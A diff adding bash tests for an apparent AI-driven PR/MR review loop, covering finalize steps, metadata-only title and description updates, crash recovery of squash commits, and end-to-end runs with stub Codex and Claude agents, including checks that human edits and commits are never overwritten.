+# A review that lands no net change still runs the closing turn on a PR/MR:
+# corrections to a stale title/description the rounds agreed on are the one
+# remaining write.
+
+t "finalize [PR/MR]: a zero-commit review still refreshes stale PR text"
+local_fixture
+git -C "$LF_CLONE" update-ref refs/ai-pr-loop/local/pr-42 HEAD
+rm -f "$WORK/fin-argv.ghedit"
+finalize_run_pr STUB_FINALIZE_TITLE='Corrected title'
+assert_eq "$FIN_RC" 3
+assert_pair "$WORK/fin-argv.ghedit" --title 'Corrected title'
+assert_eq "$(remote_head)" "$LF_BASE"
+assert_eq "$(cat "$LF_STATE/local/completed.sha")" "$LF_BASE"
+
+t "finalize [PR/MR]: a net-zero review still refreshes stale PR text"
+local_fixture
+printf 'x\n' >> "$LF_CLONE/f"; git -C "$LF_CLONE" commit -qam "round 1"
+git -C "$LF_CLONE" revert --no-edit HEAD >/dev/null
+git -C "$LF_CLONE" update-ref refs/ai-pr-loop/local/pr-42 HEAD
+rm -f "$WORK/fin-argv.ghedit"
+finalize_run_pr STUB_FINALIZE_DESC='Corrected body'
+assert_eq "$FIN_RC" 3
+assert_line "$WORK/fin-argv.ghedit" --body-file
+assert_eq "$(remote_head)" "$LF_BASE"
+assert_eq "$(local_head)" "$LF_BASE"
+assert_eq "$(cat "$LF_STATE/local/completed.sha")" "$LF_BASE"
+
+t "finalize [PR/MR]: a zero-commit review with nothing stale writes nothing"
+local_fixture
+git -C "$LF_CLONE" update-ref refs/ai-pr-loop/local/pr-42 HEAD
+rm -f "$WORK/fin-argv.ghedit"
+finalize_run_pr
+assert_eq "$FIN_RC" 3
+if [[ -e "$WORK/fin-argv.ghedit" ]]; then
+  bad "edited the PR text with nothing proposed"; else ok; fi
+assert_eq "$(cat "$LF_STATE/local/completed.sha")" "$LF_BASE"
+
+t "finalize [PR/MR]: --no-push holds the metadata-only finish too"
+local_fixture
+git -C "$LF_CLONE" update-ref refs/ai-pr-loop/local/pr-42 HEAD
+rm -f "$WORK/fin-argv.ghedit"
+finalize_run_pr NO_PUSH=1 STUB_FINALIZE_TITLE='Corrected title'
+assert_eq "$FIN_RC" 0
+if [[ -e "$WORK/fin-argv.ghedit" ]]; then
+  bad "edited the PR text under --no-push"; else ok; fi
+if [[ -e "$LF_STATE/local/completed.sha" ]]; then
+  bad "--no-push marked the review completed"; else ok; fi
+
+t "finalize [PR/MR]: a metadata-only hold records its outcome kind"
+assert_eq "$(awk '{print $1}' "$LF_STATE/local/finalized" 2>/dev/null)" 'nocommit'
+
+t "finalize [PR/MR]: a held metadata-only finish is reused, not recomposed"
+rm -f "$WORK/fin-argv.calls" "$WORK/fin-argv.ghedit"
+finalize_run_pr                     # the finishing run, without --no-push
+assert_eq "$FIN_RC" 3
+if [[ -e "$WORK/fin-argv.calls" ]]; then
+  bad "a second closing turn was spent on a held assessment"; else ok; fi
+assert_pair "$WORK/fin-argv.ghedit" --title 'Corrected title'
+assert_eq "$(cat "$LF_STATE/local/completed.sha")" "$LF_BASE"
+
+t "finalize [PR/MR]: review-only never spends a closing turn when nothing lands"
+local_fixture
+git -C "$LF_CLONE" update-ref refs/ai-pr-loop/local/pr-42 HEAD
+rm -f "$WORK/fin-argv.calls" "$WORK/fin-argv.ghedit"
+finalize_run_pr REVIEW_ONLY=1
+assert_eq "$FIN_RC" 3
+if [[ -e "$WORK/fin-argv.calls" ]]; then
+  bad "review-only spent an implementer turn"; else ok; fi
+if [[ -e "$WORK/fin-argv.ghedit" ]]; then
+  bad "review-only wrote to the forge"; else ok; fi
+assert_eq "$(cat "$LF_STATE/local/completed.sha")" "$LF_BASE"
+
+# --- local review mode: whole-field metadata delivery is guarded ------------
+# A title/description proposal replaces the entire field, so it is valid
+# only against the text it was composed from; a human edit made while the
+# proposal was held must win. A failed delivery keeps the metadata-only
+# review retryable instead of silently completing.
+
+t "finalize [PR/MR]: a held metadata proposal is not delivered over a human edit"
+local_fixture
+git -C "$LF_CLONE" update-ref refs/ai-pr-loop/local/pr-42 HEAD
+finalize_run_pr NO_PUSH=1 STUB_FINALIZE_TITLE='Corrected title'
+assert_eq "$FIN_RC" 0
+rm -f "$WORK/fin-argv.calls" "$WORK/fin-argv.ghedit"
+finalize_run_pr STUB_PR_TITLE='Human retitled this'
+assert_eq "$FIN_RC" 1
+if [[ -e "$WORK/fin-argv.ghedit" ]]; then
+  bad "the stale proposal was delivered over the human edit"; else ok; fi
+if [[ -e "$WORK/fin-argv.calls" ]]; then
+  bad "a turn was spent before the staleness check"; else ok; fi
+if [[ -e "$LF_STATE/local/finalized" || -e "$LF_STATE/local/pr-title.txt" ]]; then
+  bad "the stale proposal was kept instead of dropped for reassessment"; else ok; fi
+
+t "finalize [PR/MR]: the dropped stale proposal is reassessed on the next run"
+rm -f "$WORK/fin-argv.calls" "$WORK/fin-argv.ghedit"
+finalize_run_pr STUB_PR_TITLE='Human retitled this' \
+  STUB_FINALIZE_TITLE='Corrected against new text'
+assert_eq "$FIN_RC" 3
+if [[ -e "$WORK/fin-argv.calls" ]]; then ok
+else bad "no fresh closing turn ran after the stale drop"; fi
+assert_pair "$WORK/fin-argv.ghedit" --title 'Corrected against new text'
+assert_eq "$(cat "$LF_STATE/local/completed.sha")" "$LF_BASE"
+
+t "finalize [PR/MR]: a held squash's stale metadata is dropped, never delivered"
+local_pr_fixture
+finalize_run_pr NO_PUSH=1 STUB_FINALIZE_TITLE='New title'
+assert_eq "$FIN_RC" 0
+rm -f "$WORK/fin-argv.ghedit"
+finalize_run_pr STUB_PR_TITLE='Human retitled this'
+assert_eq "$FIN_RC" 0                       # the push is the outcome; it lands
+assert_eq "$(remote_head)" "$(local_head)"
+if [[ -e "$WORK/fin-argv.ghedit" ]]; then
+  bad "the stale metadata was delivered over the human edit"; else ok; fi
+assert_eq "$(cat "$LF_STATE/local/completed.sha")" "$(local_head)"
+
+t "finalize [PR/MR]: an edit to the un-proposed field does not block delivery"
+local_fixture
+git -C "$LF_CLONE" update-ref refs/ai-pr-loop/local/pr-42 HEAD
+finalize_run_pr NO_PUSH=1 STUB_FINALIZE_TITLE='Corrected title'
+assert_eq "$FIN_RC" 0
+rm -f "$WORK/fin-argv.calls" "$WORK/fin-argv.ghedit"
+finalize_run_pr STUB_PR_BODY='Human edited the body'
+assert_eq "$FIN_RC" 3
+assert_pair "$WORK/fin-argv.ghedit" --title 'Corrected title'
+assert_eq "$(cat "$LF_STATE/local/completed.sha")" "$LF_BASE"
+
+t "finalize [PR/MR]: an already-applied delivery is recognized as done"
+local_fixture
+git -C "$LF_CLONE" update-ref refs/ai-pr-loop/local/pr-42 HEAD
+finalize_run_pr NO_PUSH=1 STUB_FINALIZE_TITLE='Corrected title'
+assert_eq "$FIN_RC" 0
+rm -f "$WORK/fin-argv.calls" "$WORK/fin-argv.ghedit"
+finalize_run_pr STUB_PR_TITLE='Corrected title'   # the server already has it
+assert_eq "$FIN_RC" 3
+if [[ -e "$WORK/fin-argv.ghedit" ]]; then
+  bad "re-delivered an already-applied update"; else ok; fi
+assert_eq "$(cat "$LF_STATE/local/completed.sha")" "$LF_BASE"
+
+t "finalize [PR/MR]: a failed metadata-only delivery is retried, not lost"
+local_fixture
+git -C "$LF_CLONE" update-ref refs/ai-pr-loop/local/pr-42 HEAD
+finalize_run_pr STUB_FINALIZE_TITLE='Corrected title' STUB_GH_EDIT_FAIL=1
+assert_eq "$FIN_RC" 1
+if [[ -e "$LF_STATE/local/completed.sha" ]]; then
+  bad "a failed delivery was marked completed"; else ok; fi
+rm -f "$WORK/fin-argv.calls" "$WORK/fin-argv.ghedit"
+finalize_run_pr
+assert_eq "$FIN_RC" 3
+if [[ -e "$WORK/fin-argv.calls" ]]; then
+  bad "the retry spent another closing turn"; else ok; fi
+assert_pair "$WORK/fin-argv.ghedit" --title 'Corrected title'
+assert_eq "$(cat "$LF_STATE/local/completed.sha")" "$LF_BASE"
+
+t "finalize [GitLab]: a failed metadata-only delivery is retried"
+local_fixture
+git -C "$LF_CLONE" update-ref refs/ai-pr-loop/local/pr-42 HEAD
+: > "$WORK/fin-curl.log"
+finalize_run_gl STUB_FINALIZE_DESC='Corrected body' STUB_CURL_FAIL_PUT=1
+assert_eq "$FIN_RC" 1
+if [[ -e "$LF_STATE/local/completed.sha" ]]; then
+  bad "a failed MR delivery was marked completed"; else ok; fi
+: > "$WORK/fin-curl.log"
+rm -f "$WORK/fin-argv.calls"
+finalize_run_gl
+assert_eq "$FIN_RC" 3
+if [[ -e "$WORK/fin-argv.calls" ]]; then
+  bad "the retry spent another closing turn"; else ok; fi
+if grep -q '^PUT .*merge_requests' "$WORK/fin-curl.log"; then ok
+else bad "the retried delivery never reached the MR"; fi
+assert_eq "$(cat "$LF_STATE/local/completed.sha")" "$LF_BASE"
+
+t "finalize: an interrupted terminal transition publishes completed.sha first"
+local_fixture; local_round 1
+# Killed between publish and cleanup; the subshell mutes the SIGKILL notice.
+( finalize_run STUB_KILL_AFTER_MV=completed.sha ) 2>/dev/null
+assert_eq "$(cat "$LF_STATE/local/completed.sha" 2>/dev/null)" "$(local_head)"
+if [[ -e "$LF_STATE/local/base.sha" ]]; then ok   # cleanup had not run yet
+else bad "cleanup ran before the terminal marker was published"; fi
+
+t "finalize: the interrupted terminal transition heals on the next run"
+finalize_run
+assert_eq "$FIN_RC" 0
+if [[ -e "$LF_STATE/local/base.sha" || -e "$LF_STATE/local/finalized" ]]; then
+  bad "stale markers survived the healing rerun"; else ok; fi
+assert_eq "$(remote_head)" "$(local_head)"
+
+t "finalize: an interrupted squash publication (tip unanchored) is repaired"
+local_fixture; local_round 1
+# The state a prior round leaves: tip.sha names the round (anchored by that
+# round's local_record_tip).
+printf '%s\n' "$(local_head)" > "$LF_STATE/local/tip.sha"
+_round=$(local_head)
+# Killed after finalized.sha is published but before local_record_tip
+# anchors tip.sha: the branch is at the squash, tip.sha still the round.
+( finalize_run STUB_KILL_AFTER_MV=finalized ) 2>/dev/null
+assert_eq "$(awk '{print $1}' "$LF_STATE/local/finalized" 2>/dev/null)" 'squash'
+assert_eq "$(awk '{print $2}' "$LF_STATE/local/finalized" 2>/dev/null)" "$(local_head)"
+assert_eq "$(cat "$LF_STATE/local/tip.sha")" "$_round"   # tip.sha lags at the round
+
+t "finalize: the interrupted squash publication completes on retry"
+finalize_run
+assert_eq "$FIN_RC" 0
+assert_eq "$(remote_head)" "$(local_head)"
+assert_eq "$(git -C "$LF_CLONE" rev-list --count "$LF_BASE..HEAD")" 1
+assert_eq "$(cat "$LF_STATE/local/completed.sha")" "$(local_head)"
+
+t "sync_repo_to_local_head: adopts an unanchored finalize squash, not foreign"
+local_fixture; local_round 1
+_round=$(local_head)
+_sq=$(git -C "$LF_CLONE" commit-tree "$_round^{tree}" -p "$LF_BASE" -m squash \
+        -c user.name=t -c user.email=t@t 2>/dev/null \
+      || GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t \
+         git -C "$LF_CLONE" commit-tree "$_round^{tree}" -p "$LF_BASE" -m squash)
+git -C "$LF_CLONE" update-ref refs/heads/feature/x "$_sq"   # branch at the squash
+printf '%s %s\n' "squash" "$_sq" > "$LF_STATE/local/finalized"       # recorded, kind squash
+# A prior round anchored tip.sha at the round; the killed finalize never
+# advanced it. Without the adopt, sync dies "moved outside the loop".
+printf '%s\n' "$_round" > "$LF_STATE/local/tip.sha"
+if env -i PATH="/usr/bin:/bin" HOME="$WORK" \
+     LOCAL_MODE=1 LOCAL_SCOPE=branch REPO_DIR="$LF_CLONE" HEAD_REF=feature/x \
+     STATE_DIR="$LF_STATE" MANAGED_CLONE=0 \
+     "$BASH_BIN" -c ". '$ROOT/lib/common.sh'; sync_repo_to_local_head" >/dev/null 2>&1; then
+  assert_eq "$(cat "$LF_STATE/local/tip.sha")" "$_sq"
+  assert_eq "$(git -C "$LF_CLONE" rev-parse HEAD)" "$_sq"
+else bad "the sync rejected the loop's own unanchored squash as foreign movement"; fi
+
+t "sync_repo_to_local_head: a foreign branch past the squash is not adopted"
+local_fixture; local_round 1
+_round=$(local_head)
+_sq=$(GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t \
+        git -C "$LF_CLONE" commit-tree "$_round^{tree}" -p "$LF_BASE" -m squash)
+git -C "$LF_CLONE" update-ref refs/heads/feature/x "$_sq"
+printf '%s %s\n' "squash" "$_sq" > "$LF_STATE/local/finalized"
+printf '%s\n' "$_round" > "$LF_STATE/local/tip.sha"
+# A human stacks a commit on the squash — descends from it, but is NOT the
+# loop's own finalize output; adopting it would clobber the human commit.
+echo human >> "$LF_CLONE/f"; git -C "$LF_CLONE" commit -qam "human on top"
+_human=$(git -C "$LF_CLONE" rev-parse HEAD)
+if env -i PATH="/usr/bin:/bin" HOME="$WORK" \
+     LOCAL_MODE=1 LOCAL_SCOPE=branch REPO_DIR="$LF_CLONE" HEAD_REF=feature/x \
+     STATE_DIR="$LF_STATE" MANAGED_CLONE=0 \
+     "$BASH_BIN" -c ". '$ROOT/lib/common.sh'; sync_repo_to_local_head" >/dev/null 2>&1; then
+  bad "adopted a foreign branch position as the finalize squash"
+else
+  assert_eq "$(git -C "$LF_CLONE" rev-parse refs/heads/feature/x)" "$_human"  # untouched
+fi
+
+t "sync_repo_to_local_head: adopts a squash from the in-progress marker (no journal)"
+# The commit→journal window: the squash commit exists (branch moved to it)
+# but the outcome journal was never written; only the in-progress marker
+# (base + approved tree) records the intent.
+local_fixture; local_round 1
+_round=$(local_head); _tree=$(git -C "$LF_CLONE" rev-parse "$_round^{tree}")
+_sq=$(GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t \
+        git -C "$LF_CLONE" commit-tree "$_tree" -p "$LF_BASE" -m squash)
+git -C "$LF_CLONE" update-ref refs/heads/feature/x "$_sq"     # branch at the squash
+printf '%s %s\n' "$LF_BASE" "$_tree" > "$LF_STATE/local/finalize-inprogress"
+printf '%s\n' "$_round" > "$LF_STATE/local/tip.sha"           # no finalized journal yet
+if env -i PATH="/usr/bin:/bin" HOME="$WORK" \
+     LOCAL_MODE=1 LOCAL_SCOPE=branch REPO_DIR="$LF_CLONE" HEAD_REF=feature/x \
+     STATE_DIR="$LF_STATE" MANAGED_CLONE=0 \
+     "$BASH_BIN" -c ". '$ROOT/lib/common.sh'; sync_repo_to_local_head" >/dev/null 2>&1; then
+  assert_eq "$(cat "$LF_STATE/local/tip.sha")" "$_sq"
+  assert_eq "$(awk '{print $1" "$2}' "$LF_STATE/local/finalized")" "squash $_sq"  # journaled
+  assert_eq "$(git -C "$LF_CLONE" rev-parse HEAD)" "$_sq"
+else bad "the sync did not recover the squash from the in-progress marker"; fi
+
+t "finalize [branch]: a kind-only/no-journal interruption completes on retry"
+# End to end: the squash exists on the branch, the in-progress marker is
+# set, no journal, and the message was already composed (as in a real
+# crash). A finalize retry adopts the squash, journals it, and pushes it.
+local_fixture; local_round 1
+printf '%s\n' "$(local_head)" > "$LF_STATE/local/tip.sha"
+_round=$(local_head); _tree=$(git -C "$LF_CLONE" rev-parse "$_round^{tree}")
+_sq=$(GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t \
+        git -C "$LF_CLONE" commit-tree "$_tree" -p "$LF_BASE" -m squash)
+git -C "$LF_CLONE" update-ref refs/heads/feature/x "$_sq"
+printf '%s %s\n' "$LF_BASE" "$_tree" > "$LF_STATE/local/finalize-inprogress"
+printf 'Squashed subject line\n' > "$LF_STATE/local/commit-message.txt"
+finalize_run
+assert_eq "$FIN_RC" 0
+assert_eq "$(remote_head)" "$_sq"
+assert_eq "$(cat "$LF_STATE/local/completed.sha")" "$_sq"
+
+t "local_adopt: a single round is not mistaken for the squash (pr scope, no journal)"
+# The squash and a single round share parent (base) and tree (approved), so
+# the in-progress recovery must pick the squash on HEAD, not the round the
+# ref still names. PR scope: ref at the round, detached HEAD at the squash.
+local_pr_fixture                                       # ref refs/ai-pr-loop/local/pr-42 at round R
+_round=$(local_head); _tree=$(git -C "$LF_CLONE" rev-parse "$_round^{tree}")
+_sq=$(GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t \
+        git -C "$LF_CLONE" commit-tree "$_tree" -p "$LF_BASE" -m 'composed squash')  # distinct SHA
+git -C "$LF_CLONE" checkout -q --detach "$_sq"         # HEAD at the squash, ref still at R
+printf '%s %s\n' "$LF_BASE" "$_tree" > "$LF_STATE/local/finalize-inprogress"
+printf '%s\n' "$_round" > "$LF_STATE/local/tip.sha"    # tip.sha still names the round
+if env -i PATH="/usr/bin:/bin" HOME="$WORK" \
+     LOCAL_MODE=1 LOCAL_SCOPE=pr PR_NUMBER=42 REPO_DIR="$LF_CLONE" STATE_DIR="$LF_STATE" \
+     BASE_REF=main HEAD_REF=feature/x MANAGED_CLONE=1 \
+     "$BASH_BIN" -c ". '$ROOT/lib/common.sh'; local_adopt_finalized_squash" >/dev/null 2>&1; then
+  assert_eq "$(awk '{print $2}' "$LF_STATE/local/finalized")" "$_sq"   # the squash, not the round
+  assert_eq "$(cat "$LF_STATE/local/tip.sha")" "$_sq"
+else bad "adopt did not recover the squash from the in-progress marker in pr scope"; fi
+
+t "finalize: writes the in-progress marker before the squash commit moves HEAD"
+# A git wrapper fails the mechanical squash commit, so finalize dies inside
+# the publication window — with the marker already on disk and no journal.
+local_fixture; local_round 1
+_base=$(cat "$LF_STATE/local/base.sha"); _tree=$(git -C "$LF_CLONE" rev-parse 'HEAD^{tree}')
+_gitshim="$WORK/gitshim-$RANDOM"; mkdir -p "$_gitshim"
+{ printf '#!/usr/bin/env bash\n'
+  printf 'for a in "$@"; do [[ "$a" == commit ]] && c=1; [[ "$a" == -F ]] && f=1; done\n'
+  printf '[[ -n "${c:-}" && -n "${f:-}" ]] && exit 1\n'
+  printf 'exec /usr/bin/git "$@"\n'; } > "$_gitshim/git"
+chmod +x "$_gitshim/git"
+env -i PATH="$_gitshim:$STUBS:/usr/bin:/bin" HOME="$WORK" ARGV_FILE="$WORK/fin-argv" \
+  CODEX_HOME="$WORK/codex-home" \
+  LOCAL_MODE=1 LOCAL_SCOPE=branch FORGE=local MANAGED_CLONE=0 \
+  REPO_DIR="$LF_CLONE" STATE_DIR="$LF_STATE" BASE_REF=main HEAD_REF=feature/x ITER=3 MAX_ITER=6 \
+  REPO_SLUG= REPO_OWNER= REPO_NAME= PR_NUMBER= GH_USER= HAS_CONTEXT=0 \
+  CLAUDE_MODEL=off CLAUDE_EFFORT=off CLAUDE_PERMS=off \
+  "$BASH_BIN" "$ROOT/finalize_turn.sh" > "$WORK/fin.log" 2>&1
+assert_eq "$?" 1
+assert_eq "$(cat "$LF_STATE/local/finalize-inprogress")" "$_base $_tree"   # base first, tree second
+if [[ ! -e "$LF_STATE/local/finalized" ]]; then ok
+else bad "a finalized journal was written before the squash commit succeeded"; fi
+
+t "reconcile_pending_turn [PR/MR]: advances the ref to the validated commit"
+# The done-recovery pr-scope path: the private ref still names the pre-turn
+# tip while the validated commit sits on a detached HEAD. reconcile advances
+# the ref (and tip.sha) to that exact commit.
+local_fixture; local_round 1
+_ptip=$(local_head)
+_post=$(GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t \
+          git -C "$LF_CLONE" commit-tree "$_ptip^{tree}" -p "$_ptip" -m post)  # child of the pre-turn tip
+git -C "$LF_CLONE" update-ref refs/ai-pr-loop/local/pr-42 "$_ptip"    # ref never advanced
+printf '%s\n' "$_ptip" > "$LF_STATE/local/tip.sha"
+mkdir -p "$LF_STATE/iter-01"; printf 'resp\n' > "$LF_STATE/iter-01/claude-response.md"
+printf 'done 1 %s %s\n' "$_ptip" "$_post" > "$LF_STATE/local/pending-turn"
+if setup_run reconcile_pending_turn; then
+  assert_eq "$(git -C "$LF_CLONE" rev-parse refs/ai-pr-loop/local/pr-42)" "$_post"
+  assert_eq "$(cat "$LF_STATE/local/tip.sha")" "$_post"
+  if [[ ! -e "$LF_STATE/local/pending-turn" ]]; then ok
+  else bad "the receipt survived a successful recovery"; fi
+else bad "reconcile failed to advance the pr-scope ref ($(tail -1 "$WORK/setup.log"))"; fi
+
+t "local_setup_repo [PR/MR]: adopts its own ref-advanced/tip-lag squash"
+# State C: a killed adopt already advanced the private ref to the squash
+# but had not written tip.sha. The next adopt must accept cur == the squash
+# (its own partial work), not only cur == the recorded round.
+local_pr_fixture                                             # ref at round R, tip.sha=R
+_round=$(local_head); _tree=$(git -C "$LF_CLONE" rev-parse "$_round^{tree}")
+_sq=$(GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t \
+        git -C "$LF_CLONE" commit-tree "$_tree" -p "$LF_BASE" -m squash)
+git -C "$LF_CLONE" update-ref refs/ai-pr-loop/local/pr-42 "$_sq"   # ref advanced to squash
+printf '%s %s\n' "squash" "$_sq" > "$LF_STATE/local/finalized"
+printf '%s\n' "$_round" > "$LF_STATE/local/tip.sha"               # tip.sha still lags
+if setup_run local_setup_repo; then
+  assert_eq "$(cat "$LF_STATE/local/tip.sha")" "$_sq"
+  assert_eq "$(git -C "$LF_CLONE" rev-parse refs/ai-pr-loop/local/pr-42)" "$_sq"
+else bad "adopt rejected its own ref-advanced squash ($(tail -1 "$WORK/setup.log"))"; fi
+
+t "local_setup_repo [PR/MR]: a push that landed before completion is recognized"
+local_pr_fixture
+finalize_run_pr                      # pushes the squash and completes
+_s=$(local_head)
+# The crash window: push landed, terminal marker not yet written.
+printf '%s\n' "$LF_BASE" > "$LF_STATE/local/base.sha"
+printf '%s\n' "$_s"      > "$LF_STATE/local/tip.sha"
+printf '%s %s\n' "squash" "$_s" > "$LF_STATE/local/finalized"
+printf '%s\n%s\n' "$LF_REMOTE" "$LF_REMOTE" > "$LF_STATE/local/origin.url"
+rm -f "$LF_STATE/local/completed.sha"
+git -C "$LF_CLONE" update-ref refs/ai-pr-loop/local/pr-42 "$_s"
+if setup_run local_setup_repo && [[ "$(local_head)" == "$_s" ]]; then ok
+else bad "resume rejected an already-landed push ($(tail -1 "$WORK/setup.log"))"; fi
+assert_substr "$WORK/setup.log" 'already reached the remote'
+
+t "finalize [PR/MR]: an already-landed push completes idempotently"
+finalize_run_pr
+assert_eq "$FIN_RC" 0
+assert_eq "$(remote_head)" "$_s"
+assert_eq "$(cat "$LF_STATE/local/completed.sha")" "$_s"
+
 # --- local review mode: keeping the rounds alive ---------------------------
 
 t "sync_repo_to_local_head: keeps local rounds and drops turn leftovers"
@@ -4817,6 +5650,456 @@ if env -i PATH="/usr/bin:/bin" HOME="$WORK" \
      "$BASH_BIN" -c ". '$ROOT/lib/common.sh'; sync_repo_to_local_head" >/dev/null 2>&1; then
   bad "a detached HEAD was silently accepted"; else ok; fi
 git -C "$LF_CLONE" checkout -q feature/x
+
+t "sync_repo_to_local_head: a tip off the recorded round fails closed"
+local_fixture; local_round 1
+printf '%s\n' "$(local_head)" > "$LF_STATE/local/tip.sha"   # what local_record_tip persists
+printf 'foreign\n' >> "$LF_CLONE/f"
+git -C "$LF_CLONE" commit -qam "foreign commit"             # a commit no turn made
+if env -i PATH="/usr/bin:/bin" HOME="$WORK" \
+     LOCAL_MODE=1 LOCAL_SCOPE=branch REPO_DIR="$LF_CLONE" HEAD_REF=feature/x \
+     STATE_DIR="$LF_STATE" MANAGED_CLONE=0 \
+     "$BASH_BIN" -c ". '$ROOT/lib/common.sh'; sync_repo_to_local_head" >/dev/null 2>&1; then
+  bad "a foreign commit on the branch was silently adopted"; else ok; fi
+
+# --- local review mode: run.sh end to end (real git, stub agents) -----------
+# Whole-orchestrator runs on a PR-less branch review with no origin: the
+# terminal-state transitions (converged/approved -> completed -> no-op rerun
+# -> --restart from a new base) only exist across invocations of run.sh
+# itself. Each fixture gets its own loop home so state dirs never collide.
+
+e2e_fixture() {  # -> $E2E_CLONE (no origin, branch feature/x), $E2E_BASE, $E2E_HOME
+  local n="e2e$RANDOM$RANDOM"
+  E2E_CLONE="$WORK/$n-clone"; git init -q -b main "$E2E_CLONE"
+  git -C "$E2E_CLONE" config user.email t@t; git -C "$E2E_CLONE" config user.name t
+  echo base > "$E2E_CLONE/f"; git -C "$E2E_CLONE" add f; git -C "$E2E_CLONE" commit -qm base
+  git -C "$E2E_CLONE" checkout -qb feature/x
+  echo head >> "$E2E_CLONE/f"; git -C "$E2E_CLONE" commit -qam "human work"
+  E2E_BASE=$(git -C "$E2E_CLONE" rev-parse HEAD)
+  E2E_HOME="$WORK/$n-home"; mkdir -p "$E2E_HOME"
+  ln -s "$ROOT/run.sh" "$ROOT/codex_turn.sh" "$ROOT/claude_turn.sh" \
+        "$ROOT/finalize_turn.sh" "$ROOT/lib" "$ROOT/prompts" "$E2E_HOME/"
+}
+e2e_fixture_origin() {  # e2e_fixture plus a bare origin holding both branches
+  e2e_fixture
+  E2E_REMOTE="$WORK/${E2E_CLONE##*/}-remote.git"
+  git init -q --bare -b main "$E2E_REMOTE"
+  git -C "$E2E_CLONE" remote add origin "$E2E_REMOTE"
+  git -C "$E2E_CLONE" push -q origin refs/heads/main refs/heads/feature/x
+}
+run_e2e() {  # [VAR=VAL ...] [args ...]
+  local envs=()
+  while [[ $# -gt 0 && "$1" == [A-Z_]*=* ]]; do envs+=("$1"); shift; done
+  mkdir -p "$WORK/codex-home/sessions"   # session snapshots run before the stub creates it
+  # --no-auto-resume: these cases assert on the WORKER — its rounds, its
+  # terminal state, and how the NEXT invocation recovers from a killed one.
+  # A supervised run would relaunch the worker itself and detach the loop
+  # from this process, so the crash cases could never be observed here.
+  env -i PATH="$STUBS:/usr/bin:/bin" HOME="$WORK" ARGV_FILE="$WORK/e2e-argv" \
+    CODEX_HOME="$WORK/codex-home" ${envs[@]+"${envs[@]}"} \
+    "$BASH_BIN" "$E2E_HOME/run.sh" "$@" --no-auto-resume > "$WORK/e2e.out" 2>&1
+  E2E_RC=$?
+}
+e2e_state() { echo "$E2E_HOME"/state/local__*/branch-*; }
+e2e_iters() { ls -d "$(e2e_state)"/iter-* 2>/dev/null | wc -l; }
+
+t "run.sh e2e: a NIT-only convergence completes and terminates the review"
+e2e_fixture
+run_e2e STUB_CODEX_VERDICT=CHANGES_REQUESTED \
+  --local --base main --dir "$E2E_CLONE" --converge 1 --max 3
+assert_eq "$E2E_RC" 0
+assert_eq "$(cat "$(e2e_state)/local/completed.sha" 2>/dev/null)" "$E2E_BASE"
+if [[ -e "$(e2e_state)/local/base.sha" ]]; then
+  bad "base.sha survived a converged review"; else ok; fi
+
+t "run.sh e2e: a plain rerun of a completed review is a no-op"
+_iters=$(e2e_iters)
+run_e2e STUB_CODEX_VERDICT=CHANGES_REQUESTED \
+  --local --base main --dir "$E2E_CLONE" --converge 1 --max 3
+assert_eq "$E2E_RC" 0
+assert_substr "$WORK/e2e.out" 'already completed'
+assert_eq "$(e2e_iters)" "$_iters"
+
+t "run.sh e2e: --restart reviews the current state from a new base"
+run_e2e STUB_CODEX_VERDICT=CHANGES_REQUESTED \
+  --local --base main --dir "$E2E_CLONE" --converge 1 --max 3 --restart
+assert_eq "$E2E_RC" 0
+assert_eq "$(e2e_iters)" "$((_iters + 1))"
+assert_eq "$(cat "$(e2e_state)/local/completed.sha" 2>/dev/null)" "$E2E_BASE"
+
+t "run.sh e2e: requested changes, a fix round, approval — one terminal squash"
+e2e_fixture
+printf 'CHANGES_REQUESTED\nAPPROVED\n' > "$WORK/e2e-verdicts"
+run_e2e STUB_CODEX_VERDICT_SEQ="$WORK/e2e-verdicts" STUB_CODEX_BLOCKERS=1 \
+  STUB_CLAUDE_COMMIT=1 --local --base main --dir "$E2E_CLONE" --max 4
+assert_eq "$E2E_RC" 0
+assert_eq "$(git -C "$E2E_CLONE" rev-list --count "$E2E_BASE..HEAD")" 1
+assert_eq "$(git -C "$E2E_CLONE" log -1 --format=%s)" 'Squashed subject line'
+assert_eq "$(cat "$(e2e_state)/local/completed.sha" 2>/dev/null)" \
+          "$(git -C "$E2E_CLONE" rev-parse HEAD)"
+
+t "run.sh e2e: a human commit after completion survives rerun and --restart"
+_done=$(git -C "$E2E_CLONE" rev-parse HEAD)
+printf 'human follow-up\n' >> "$E2E_CLONE/f"
+git -C "$E2E_CLONE" commit -qam "human follow-up"
+_human=$(git -C "$E2E_CLONE" rev-parse HEAD)
+run_e2e --local --base main --dir "$E2E_CLONE" --max 4
+assert_eq "$E2E_RC" 0
+assert_eq "$(git -C "$E2E_CLONE" rev-parse HEAD)" "$_human"
+run_e2e --local --base main --dir "$E2E_CLONE" --max 4 --restart
+assert_eq "$E2E_RC" 0
+if git -C "$E2E_CLONE" merge-base --is-ancestor "$_human" HEAD \
+   && git -C "$E2E_CLONE" merge-base --is-ancestor "$_done" HEAD; then ok
+else bad "a completed review's rerun rewrote the human commit or the squash"; fi
+
+t "run.sh e2e: a failed implementer turn's commits are dropped, resume proceeds"
+e2e_fixture
+run_e2e STUB_CODEX_VERDICT=CHANGES_REQUESTED STUB_CODEX_BLOCKERS=1 \
+  STUB_CLAUDE_COMMIT=1 STUB_NO_CLAUDE_LOCAL_ARTIFACT=1 \
+  --local --base main --dir "$E2E_CLONE" --max 1
+assert_eq "$E2E_RC" 1
+assert_eq "$(git -C "$E2E_CLONE" rev-parse HEAD)" "$E2E_BASE"   # rogue commit dropped
